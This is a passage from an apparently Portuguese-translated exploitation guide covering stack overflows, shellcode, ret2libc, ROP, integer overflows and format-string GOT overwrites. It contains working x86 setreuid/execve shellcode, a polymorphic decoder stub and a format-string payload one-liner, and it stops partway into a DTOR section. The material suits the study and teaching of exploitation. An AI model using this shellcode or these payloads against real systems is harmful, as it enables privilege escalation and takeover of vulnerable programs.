AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

O objetivo deste exerc√≠cio √© explorar uma vulnerabilidade de estouro de pilha b√°sica em um programa Linux. Vamos usar uma t√©cnica conhecida como "Return-Oriented Programming" (ROP) para desviar o fluxo de execu√ß√£o do programa e executar nosso pr√≥prio c√≥digo.

Neste exerc√≠cio, voc√™ encontrar√° um programa chamado `vuln` que possui uma vulnerabilidade de estouro de pilha. Seu objetivo √© explorar essa vulnerabilidade para obter acesso ao shell do sistema.

O programa `vuln` possui uma fun√ß√£o `vulnerable_function` que copia dados de entrada para um buffer sem verificar o tamanho. Isso permite que um atacante insira mais dados do que o buffer pode armazenar, resultando em um estouro de pilha.

Seu objetivo √© explorar essa vulnerabilidade para executar o c√≥digo `shellcode` fornecido. O `shellcode` √© um c√≥digo assembly que executa um shell do sistema. Voc√™ precisar√° encontrar o endere√ßo de retorno correto na pilha para redirecionar o fluxo de execu√ß√£o para o `shellcode`.

Para facilitar o exerc√≠cio, fornecemos um arquivo `exploit.py` que gera automaticamente o payload necess√°rio para explorar a vulnerabilidade. Voc√™ pode executar o exploit usando o seguinte comando:

```
python exploit.py | ./vuln
```

Se tudo correr bem, voc√™ dever√° obter um shell do sistema e poder√° executar comandos no contexto do programa `vuln`.

Lembre-se de que este exerc√≠cio √© apenas para fins educacionais e deve ser realizado em um ambiente controlado. N√£o √© √©tico explorar vulnerabilidades em sistemas sem permiss√£o.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode armazenada l√° (procura por alguma assinatura presente na shellcode). √ötil nos casos em que h√° apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes polim√≥rficos**

S√£o shells criptografadas que possuem um pequeno c√≥digo que as descriptografa e salta para ele, usando o truque Call-Pop. Aqui est√° um **exemplo de criptografia de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Atacando o Frame Pointer (EBP)**

√ötil em uma situa√ß√£o em que podemos modificar o EBP, mas n√£o o EIP.

Sabe-se que ao sair de uma fun√ß√£o, o seguinte c√≥digo assembly √© executado:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, se pode modificar o EBP ao sair de uma fun√ß√£o (fvuln) que foi chamada por outra fun√ß√£o, quando a fun√ß√£o que chamou fvuln terminar, seu EIP pode ser modificado.

Em fvuln, √© poss√≠vel inserir um EBP falso que aponta para um local onde est√° o endere√ßo do shellcode + 4 (√© necess√°rio adicionar 4 devido ao pop). Assim, ao sair da fun√ß√£o, o valor de &(\&Shellcode)+4 ser√° colocado em ESP, com o pop, 4 ser√° subtra√≠do de ESP e ele apontar√° para o endere√ßo do shellcode quando o ret for executado.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + preenchimento + &(\&Shellcode)+4

**Exploit Off-by-One**\
Apenas o byte menos significativo do EBP pode ser modificado. Um ataque semelhante ao anterior pode ser realizado, mas a mem√≥ria que armazena o endere√ßo do shellcode deve compartilhar os 3 primeiros bytes com o EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til quando o stack n√£o √© execut√°vel ou deixa um buffer muito pequeno para ser modificado.

O ASLR faz com que, a cada execu√ß√£o, as fun√ß√µes sejam carregadas em posi√ß√µes diferentes da mem√≥ria. Portanto, esse m√©todo pode n√£o ser eficaz nesse caso. Para servidores remotos, como o programa est√° sendo executado constantemente no mesmo endere√ßo, pode ser √∫til.

* **cdecl (C declaration)** Coloca os argumentos no stack e, ao sair da fun√ß√£o, limpa o stack
* **stdcall (standard call)** Coloca os argumentos no stack e √© a fun√ß√£o chamada que limpa o stack
* **fastcall** Coloca os dois primeiros argumentos em registradores e o restante no stack

√â colocado o endere√ßo da instru√ß√£o system da libc e √© passada como argumento a string "/bin/sh", normalmente de uma vari√°vel de ambiente. Al√©m disso, √© usado o endere√ßo da fun√ß√£o exit para que, uma vez que a shell n√£o seja mais necess√°ria, o programa saia sem problemas (e escreva logs).

**export SHELL=/bin/sh**

Para encontrar os endere√ßos necess√°rios, pode-se olhar dentro do **GDB:**\
**p system**\
**p exit**\
**rabin2 -i execut√°vel** ‚Äî> Fornece o endere√ßo de todas as fun√ß√µes usadas pelo programa ao ser carregado\
(Dentro de um start ou algum breakpoint): **x/500s $esp** ‚Äî> Procuramos aqui a string /bin/sh

Uma vez que tenhamos esses endere√ßos, o **exploit** ficaria assim:

"A" \* DIST√ÇNCIA EBP + 4 (EBP: podem ser 4 "A"s, embora seja melhor se for o EBP real para evitar falhas de segmenta√ß√£o) + Endere√ßo do **system** (sobrescrever√° o EIP) + Endere√ßo do **exit** (ao sair de system("/bin/sh"), essa fun√ß√£o ser√° chamada, pois os primeiros 4 bytes do stack s√£o tratados como o pr√≥ximo endere√ßo do EIP a ser executado) + Endere√ßo de "/bin/sh" (ser√° o par√¢metro passado para system)

Dessa forma, o EIP ser√° sobrescrito com o endere√ßo do system, que receber√° a string "/bin/sh" como par√¢metro, e ao sair dele, a fun√ß√£o exit() ser√° executada.

√â poss√≠vel encontrar a situa√ß√£o em que algum byte de algum endere√ßo de alguma fun√ß√£o seja nulo ou espa√ßo (\x20). Nesse caso, √© poss√≠vel desmontar os endere√ßos anteriores a essa fun√ß√£o, pois provavelmente haver√° v√°rios NOPs que nos permitir√£o chamar um deles em vez da fun√ß√£o diretamente (por exemplo, com > x/8i system-4).

Esse m√©todo funciona porque, ao chamar uma fun√ß√£o como system usando o opcode **ret** em vez de **call**, a fun√ß√£o entende que os primeiros 4 bytes ser√£o o endere√ßo **EIP** para retornar.

Uma t√©cnica interessante com esse m√©todo √© chamar **strncpy()** para mover um payload do stack para o heap e, em seguida, usar **gets()** para executar esse payload.

Outra t√©cnica interessante √© o uso de **mprotect()**, que permite atribuir as permiss√µes desejadas a qualquer parte da mem√≥ria. Funciona ou funcionava no BDS, MacOS e OpenBSD, mas n√£o no Linux (controla que n√£o seja poss√≠vel conceder permiss√µes de grava√ß√£o e execu√ß√£o ao mesmo tempo). Com esse ataque, seria poss√≠vel reconfigurar o stack como execut√°vel.

**Encadeamento de fun√ß√µes**

Com base na t√©cnica anterior, essa forma de exploit consiste em:\
Preenchimento + \&Fun√ß√£o1 + \&pop;ret; + \&arg\_fun1 + \&Fun√ß√£o2 + \&pop;ret; + \&arg\_fun2 + ...

Dessa forma, √© poss√≠vel encadear fun√ß√µes para chamar. Al√©m disso, se voc√™ quiser usar fun√ß√µes com v√°rios argumentos, pode colocar os argumentos necess√°rios (por exemplo, 4) e colocar os 4 argumentos e procurar um endere√ßo com opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d execut√°vel**

**Encadeamento por falsifica√ß√£o de frames (encadeamento de EBPs)**

Consiste em aproveitar a capacidade de manipular o EBP para encadear a execu√ß√£o de v√°rias fun√ß√µes por meio do EBP e do "leave;ret"

PREENCHIMENTO

* Colocamos no EBP um EBP falso que aponta para: 2¬∫ EBP\_falso + a fun√ß√£o a ser executada: (\&system() + \&leave;ret + &"/bin/sh")
* No EIP, colocamos como endere√ßo uma fun√ß√£o &(leave;ret)

Iniciamos o shellcode com o endere√ßo da pr√≥xima parte do shellcode, por exemplo: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &"/bin/sh"

o 2¬∫EBP seria: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &"/bin/ls"

Esse shellcode pode ser repetido indefinidamente nas partes da mem√≥ria √†s quais se tem acesso, de modo que um shellcode facilmente divis√≠vel em pequenos peda√ßos de mem√≥ria seja obtido.

(A execu√ß√£o de fun√ß√µes √© encadeada misturando as vulnerabilidades vistas anteriormente de EBP e ret2lib)
## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o √© poss√≠vel inserir um endere√ßo de stack no EIP (verifica-se que o EIP n√£o cont√©m 0xbf) ou quando n√£o √© poss√≠vel calcular a localiza√ß√£o do shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (o shellcode ser√° colocado aqui).

Dessa forma, ao alterar o EIP por um endere√ßo de **ret**, o pr√≥ximo endere√ßo ser√° carregado (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, o shellcode ser√° carregado.

O exploit ficaria assim: SHELLCODE + Preenchimento (at√© o EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio do shellcode, pois o endere√ßo do par√¢metro passado √© inserido na pilha)

Parece que fun√ß√µes como **strncpy**, uma vez conclu√≠das, removem da pilha o endere√ßo onde o shellcode estava armazenado, impossibilitando essa t√©cnica. Ou seja, o endere√ßo passado para a fun√ß√£o como argumento (aquele que armazena o shellcode) √© modificado para 0x00, ent√£o, ao chamar o segundo **ret**, ele encontra um 0x00 e o programa falha.
```
**Ret2PopRet**
```
Se n√£o tivermos controle sobre o primeiro argumento, mas tivermos sobre o segundo ou terceiro, podemos sobrescrever o EIP com um endere√ßo de pop-ret ou pop-pop-ret, dependendo do que precisamos.

**T√©cnica de Murat**

No Linux, todos os programas s√£o mapeados a partir de 0xbfffffff.

Ao observar como a pilha de um novo processo √© constru√≠da no Linux, podemos desenvolver um exploit de forma que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja a shellcode. O endere√ßo dela pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME_do_execut√°vel_completo) - strlen(shellcode)

Dessa forma, obter√≠amos facilmente o endere√ßo onde est√° a vari√°vel de ambiente com a shellcode.

Isso √© poss√≠vel porque a fun√ß√£o execle permite criar um ambiente que contenha apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Como o ESP est√° sempre apontando para o in√≠cio da pilha, essa t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada a **jmp esp** ou **call esp**. Dessa forma, a shellcode √© armazenada ap√≥s a sobrescrita do EIP, pois ap√≥s a execu√ß√£o do **ret**, o ESP estar√° apontando para o pr√≥ximo endere√ßo, exatamente onde a shellcode foi armazenada.

Caso o ASLR n√£o esteja ativado no Windows ou Linux, √© poss√≠vel chamar **jmp esp** ou **call esp** armazenados em algum objeto compartilhado. Caso o ASLR esteja ativado, √© poss√≠vel procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP, em vez de no meio da pilha, permite que as instru√ß√µes push ou pop executadas no meio da fun√ß√£o n√£o afetem a shellcode (o que poderia ocorrer se ela estivesse no meio da pilha da fun√ß√£o).

De forma muito semelhante a isso, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, podemos chamar **call eax** ou **jmp eax (ret2eax)**.

**ROP (Return Oriented Programming) ou trechos de c√≥digo emprestados**

Os trechos de c√≥digo invocados s√£o conhecidos como gadgets.

Essa t√©cnica consiste em encadear diferentes chamadas de fun√ß√µes usando a t√©cnica **ret2libc** e o uso de **pop,ret**.

Em algumas arquiteturas de processadores, cada instru√ß√£o √© um conjunto de 32 bits (como o MIPS, por exemplo). No entanto, na Intel, as instru√ß√µes t√™m tamanho vari√°vel e v√°rias instru√ß√µes podem compartilhar um conjunto de bits, por exemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Cont√©m os bytes 0xffe4, que tamb√©m podem ser traduzidos como: **jmp \*%esp**

Dessa forma, √© poss√≠vel executar algumas instru√ß√µes que nem mesmo est√£o no programa original.

**ROPgadget.py** nos ajuda a encontrar valores em bin√°rios.

Este programa tamb√©m serve para criar os **payloads**. Voc√™ pode fornecer a biblioteca da qual deseja extrair os ROPs e ele gerar√° um payload em Python, para o qual voc√™ fornece o endere√ßo onde a biblioteca est√° e o payload est√° pronto para ser usado como shellcode. Al√©m disso, como ele usa chamadas de sistema, ele n√£o executa nada na pilha, apenas vai armazenando endere√ßos de ROPs que ser√£o executados por meio de **ret**. Para usar esse payload, √© necess√°rio chamar o payload por meio de uma instru√ß√£o **ret**.

**Integer overflows**

Esse tipo de overflow ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o que √© passado para ela, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
No exemplo anterior, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a pr√≥pria string.

Se passarmos um n√∫mero negativo como primeiro par√¢metro, ser√° verificado que len < 256 e esse filtro ser√° ultrapassado. Al√©m disso, strlen(buffer) ser√° menor que l, pois l √© um unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim contornar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observ√°-la. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que essa vari√°vel seja controlada pelo atacante.

## **Format Strings**

Em C, **`printf`** √© uma fun√ß√£o que pode ser usada para **imprimir** uma string. O **primeiro par√¢metro** que essa fun√ß√£o espera √© o **texto bruto com os formatadores**. Os **par√¢metros seguintes** esperados s√£o os **valores** que ser√£o **substitu√≠dos** nos **formatadores** do texto bruto.

A vulnerabilidade ocorre quando um **texto do atacante √© colocado como o primeiro argumento** dessa fun√ß√£o. O atacante ser√° capaz de criar uma **entrada especial abusando das capacidades de formata√ß√£o do printf** para **escrever qualquer dado em qualquer endere√ßo**. Dessa forma, ele poder√° **executar c√≥digo arbitr√°rio**.

Formadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escreve** o **n√∫mero de bytes escritos** no **endere√ßo indicado**. Escrever** tantos bytes** quanto o n√∫mero hexadecimal que **precisamos** escrever √© como voc√™ pode **escrever qualquer dado**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Tabela de Deslocamentos Globais) / PLT (Tabela de Liga√ß√£o de Procedimentos)

Esta √© a tabela que cont√©m o **endere√ßo** das **fun√ß√µes externas** usadas pelo programa.

Obtenha o endere√ßo desta tabela com: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observe como, ap√≥s **carregar** o **execut√°vel** no GEF, voc√™ pode **ver** as **fun√ß√µes** que est√£o na **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando o GEF, voc√™ pode **iniciar** uma **sess√£o de depura√ß√£o** e executar **`got`** para ver a tabela got:

![](<../../.gitbook/assets/image (621).png>)

Em um bin√°rio, a GOT tem os **endere√ßos das fun√ß√µes ou** da se√ß√£o **PLT** que carregar√° o endere√ßo da fun√ß√£o. O objetivo deste exploit √© **substituir a entrada da GOT** de uma fun√ß√£o que ser√° executada posteriormente **pelo endere√ßo da PLT da fun√ß√£o `system`**. Idealmente, voc√™ ir√° **substituir** a **GOT** de uma **fun√ß√£o** que ser√° **chamada com par√¢metros controlados por voc√™** (assim voc√™ poder√° controlar os par√¢metros enviados para a fun√ß√£o do sistema).

Se **`system`** **n√£o for usada** pelo script, a fun√ß√£o do sistema **n√£o ter√° uma entrada na GOT**. Nesse cen√°rio, voc√™ precisar√° **vazar primeiro o endere√ßo** da fun√ß√£o `system`.

A **Tabela de Liga√ß√£o de Procedimentos** √© uma tabela **somente leitura** no arquivo ELF que armazena todos os **s√≠mbolos necess√°rios que precisam de resolu√ß√£o**. Quando uma dessas fun√ß√µes √© chamada, a GOT **redirecionar√°** o **fluxo** para a PLT para que ela possa **resolver** o **endere√ßo** da fun√ß√£o e grav√°-lo na GOT.\
Em seguida, na **pr√≥xima vez** que uma chamada for feita para esse endere√ßo, a **fun√ß√£o** ser√° **chamada diretamente** sem precisar resolv√™-la.

Voc√™ pode ver os endere√ßos da PLT com **`objdump -j .plt -d ./vuln_binary`**

### **Fluxo de Explora√ß√£o**

Como explicado anteriormente, o objetivo ser√° **sobrescrever** o **endere√ßo** de uma **fun√ß√£o** na tabela **GOT** que ser√° chamada posteriormente. Idealmente, poder√≠amos definir o **endere√ßo para um shellcode** localizado em uma se√ß√£o execut√°vel, mas √© altamente prov√°vel que voc√™ n√£o consiga escrever um shellcode em uma se√ß√£o execut√°vel.\
Ent√£o, uma op√ß√£o diferente √© **sobrescrever** uma **fun√ß√£o** que **recebe** seus **argumentos** do **usu√°rio** e **apont√°-la** para a **fun√ß√£o `system`**.

Para escrever o endere√ßo, geralmente s√£o feitos 2 passos: voc√™ **primeiro escreve 2 bytes** do endere√ßo e depois os outros 2. Para fazer isso, √© usado **`$hn`**.

**HOB** √© usado para os 2 bytes mais altos do endere√ßo\
**LOB** √© usado para os 2 bytes mais baixos do endere√ßo

Portanto, devido √† forma como a string de formata√ß√£o funciona, voc√™ precisa **escrever primeiro o menor** entre \[HOB, LOB] e depois o outro.

Se HOB < LOB\
`[endere√ßo+2][endere√ßo]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[endere√ßo+2][endere√ßo]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Modelo de Explora√ß√£o de String de Formata√ß√£o**

Voc√™ pode encontrar um **modelo** para explorar a GOT usando strings de formata√ß√£o aqui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar para o main novamente para **explorar a string de formata√ß√£o uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Observe que isso **n√£o** criar√° um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Portanto, com isso, voc√™ poder√° **ter mais uma execu√ß√£o** da vulnerabilidade.

### **Format Strings para Extrair Conte√∫do**

Uma string de formato tamb√©m pode ser abusada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o, h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer com que o **printf acesse** esse **endere√ßo** e **imprima** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento, voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Portanto, **acessando** o **8¬∫ par√¢metro**, voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Observe que, seguindo a **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** √© **carregado** e **extrair** tudo **completamente**!

### **DTOR**

{% hint style="danger" %}
